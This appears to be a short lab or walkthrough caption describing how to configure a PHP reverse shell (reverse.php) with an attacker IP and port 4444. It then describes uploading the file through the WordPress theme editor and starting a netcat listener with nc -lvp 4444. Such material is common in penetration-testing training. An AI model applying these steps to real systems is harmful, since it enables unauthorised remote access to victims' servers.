@@ -1,0 +1,34 @@
+This screenshot captures the modification of the reverse shell payload in the reverse.php file.
+
+Changes Made:
+
+Set attacker IP:
+
+php
+Copy
+Edit
+$ip = '10.38.1.110';
+Set listener port:
+
+php
+Copy
+Edit
+$port = 4444;
+Why It Matters:
+
+These are the crucial values that control where the victim system connects back.
+
+Without correctly setting the $ip and $port, the reverse shell would fail to establish.
+
+Next Step:
+
+Upload this file to the target (e.g., via the WordPress theme editor).
+
+Start a listener on the attacker machine:
+
+bash
+Copy
+Edit
+nc -lvp 4444
+Takeaway:
+Manual editing of payloads ensures they’re tailored to your current environment and network configuration.
